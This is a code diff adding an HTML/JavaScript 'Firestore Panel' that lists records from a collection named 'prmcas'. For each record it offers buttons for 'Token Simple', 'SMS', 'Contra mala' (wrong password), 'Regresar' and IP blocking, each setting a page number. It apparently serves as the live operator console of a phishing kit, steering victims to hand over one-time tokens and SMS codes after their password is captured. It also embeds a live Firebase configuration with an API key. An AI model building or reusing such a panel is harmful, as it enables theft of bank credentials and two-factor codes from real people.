@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <script src="dejadejoder.js"></script>
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"
+    integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous" />
+  <title>Firestore Panel</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 20px;
+    }
+
+    #data {
+      margin-top: 20px;
+    }
+
+    .document {
+      border: 1px solid #ccc;
+      padding: 10px;
+      margin-bottom: 10px;
+    }
+
+    .document p {
+      margin: 5px 0;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="container">
+    <h1 class="text-center my-4">Firestore Panel</h1>
+    <div id="data" class="row"></div>
+  </div>
+
+  <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-firestore.js"></script>
+  <script>
+    // Configuración de Firebase
+    const firebaseConfig = {
+      apiKey: "AIzaSyBUWnHIPZ8JOUsX0ba-f70l2S7EkRaoz5Q",
+      authDomain: "da1assdasdg.firebaseapp.com",
+      databaseURL: "https://da1assdasdg-default-rtdb.firebaseio.com",
+      projectId: "da1assdasdg",
+      storageBucket: "da1assdasdg.firebasestorage.app",
+      messagingSenderId: "612813413332",
+      appId: "1:612813413332:web:386e44f11da041562d1441",
+      measurementId: "G-KE4GNBJ4NN"
+    };
+
+    // Inicializar Firebase
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    // Función para mostrar los datos
+    function displayData(docs) {
+      const dataDiv = document.getElementById("data");
+      dataDiv.innerHTML = "";
+
+      docs.forEach((doc) => {
+        console.log(doc.id);
+        const docDiv = document.createElement("div");
+        docDiv.className = "col-md-4 document";
+        docDiv.innerHTML = `
+  <div class="card mb-3 shadow-sm border-0">
+    <div class="card-body">
+      <h5 class="card-title mb-3">
+        <strong>ID:</strong> ${doc.id}
+      </h5>
+
+      <div class="d-grid gap-2 d-md-block">
+  <button class="btn btn-danger btn-sm me-2" onclick="deleteDocument('${doc.id}')">Eliminar</button>
+          <button class="btn btn-outline-primary btn-sm me-2" onclick="changePageToTwo('${doc.id}')">
+          Token Simple
+        </button>
+  <button class="btn btn-outline-primary btn-sm me-2" onclick="changePageToFour('${doc.id}')">SMS</button>
+  <button class="btn btn-outline-warning btn-sm me-2" onclick="contramala('${doc.id}')">Contra mala</button>
+  <button class="btn btn-outline-secondary btn-sm me-2" onclick="changePaget('${doc.id}')">Regresar</button>
+  
+  <button class="btn btn-dark btn-sm me-2" onclick="bloquearIP('${doc.id}')">⛔ Bloquear IP</button>
+  <button class="btn btn-success btn-sm" onclick="desbloquearIP('${doc.id}')">🔓 Desbloquear IP</button>
+</div>
+    </div>
+  </div>
+`;
+
+        dataDiv.appendChild(docDiv);
+      });
+    }
+
+    // Obtener datos de Firestore
+    db.collection("prmcas").onSnapshot((snapshot) => {
+      const docs = snapshot.docs;
+      displayData(docs);
+    });
+
+    // Función para actualizar el documento
+    function updateDocument(id) {
+      const question1 = document.getElementById(`question1_${id}`).value;
+      const question2 = document.getElementById(`question2_${id}`).value;
+      const question3 = document.getElementById(`question3_${id}`).value;
+      db.collection("prmcas")
+        .doc(id)
+        .update({
+          question1: question1,
+          question2: question2,
+          question3: question3,
+          page: 2,
+        })
+        .then(() => {
+          console.log("Documento actualizado con ID: ", id);
+        })
+        .catch((error) => {
+          console.error("Error actualizando el documento: ", error);
+        });
+    }
+
+    // Función para eliminar el documento
+    function deleteDocument(id) {
+      db.collection("prmcas")
+        .doc(id)
+        .delete()
+        .then(() => {
+          console.log("Documento eliminado con ID: ", id);
+        })
+        .catch((error) => {
+          console.error("Error eliminando el documento: ", error);
+        });
+    }
+
+ 
+    function changePageToTwo(id) {
+      db.collection("prmcas")
+        .doc(id)
+        .update({
+          page: 3,
+        })
+        .then(() => {
+          console.log("Página cambiada a 2 para el documento con ID: ", id);
+        })
+        .catch((error) => {
+          console.error("Error cambiando la página: ", error);
+        });
+    }
+
+    function contramala(id) {
+      db.collection("prmcas")
+        .doc(id)
+        .update({
+          page: 5,
+        })
+        .then(() => {
+          console.log("Página cambiada a 2 para el documento con ID: ", id);
+        })
+        .catch((error) => {
+          console.error("Error cambiando la página: ", error);
+        });
+    }
+    function changePageToThree(id) {
+      db.collection("prmcas")
+        .doc(id)
+        .update({
+          page: 5,
+        })
+        .then(() => {
+          console.log("Página cambiada a 2 para el documento con ID: ", id);
+        })
+        .catch((error) => {
+          console.error("Error cambiando la página: ", error);
+        });
+    }
+
+    function changePageToFour(id) {
+      db.collection("prmcas")
+        .doc(id)
+        .update({
+          page: 6,
+        })
+        .then(() => {
+          console.log("Página cambiada a esm para el documento con ID: ", id);
+        })
+        .catch((error) => {
+          console.error("Error cambiando la página: ", error);
+        });
+    }
+
+    function changePaget(id) {
+      db.collection("prmcas")
+        .doc(id)
+        .update({
+          page: 4,
+        })
+        .then(() => {
+          console.log("Página cambiada a 1 para el documento con ID: ", id);
+        })
+        .catch((error) => {
+          console.error("Error cambiando la página: ", error);
+        });
+    }
+    function changePageToContra(id) {
+      db.collection("prmcas")
+        .doc(id)
+        .update({
+          page: 4,
+        })
+        .then(() => {
+          console.log("Página cambiada a 1 para el documento con ID: ", id);
+        })
+        .catch((error) => {
+          console.error("Error cambiando la página: ", error);
+        });
+    }
+
+function bloquearIP(docId) {
+  if (!confirm("¿Bloquear esta IP permanentemente?")) return;
+
+  db.collection("prmcas").doc(docId).get().then((docSnap) => {
+    if (docSnap.exists) {
+      const ip = docSnap.data().ip;
+      if (ip && ip !== "No disponible") {
+        db.collection("blocked_ips").doc(ip).set({
+          ip: ip,
+          blockedAt: firebase.firestore.FieldValue.serverTimestamp(),
+          reason: "Bloqueado desde panel"
+        }).then(() => {
+          alert(`✅ IP ${ip} ha sido bloqueada`);
+        }).catch(err => {
+          console.error(err);
+          alert("Error al bloquear IP");
+        });
+      } else {
+        alert("No se encontró IP en este registro");
+      }
+    }
+  }).catch(err => {
+    console.error(err);
+    alert("Error al obtener documento");
+  });
+}
+
+
+function desbloquearIP(docId) {
+  if (!confirm("¿Desbloquear esta IP?")) return;
+
+  db.collection("prmcas").doc(docId).get().then((docSnap) => {
+    if (docSnap.exists) {
+      const ip = docSnap.data().ip;
+      if (ip && ip !== "No disponible") {
+        db.collection("blocked_ips").doc(ip).delete().then(() => {
+          alert(`✅ IP ${ip} ha sido desbloqueada`);
+        }).catch(err => {
+          console.error(err);
+          alert("Error al desbloquear");
+        });
+      } else {
+        alert("No se encontró IP");
+      }
+    }
+  }).catch(err => {
+    console.error(err);
+    alert("Error al obtener documento");
+  });
+}
+  </script>
+  <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"
+    integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN"
+    crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js"
+    integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q"
+    crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js"
+    integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl"
+    crossorigin="anonymous"></script>
+</body>
+
+</html>
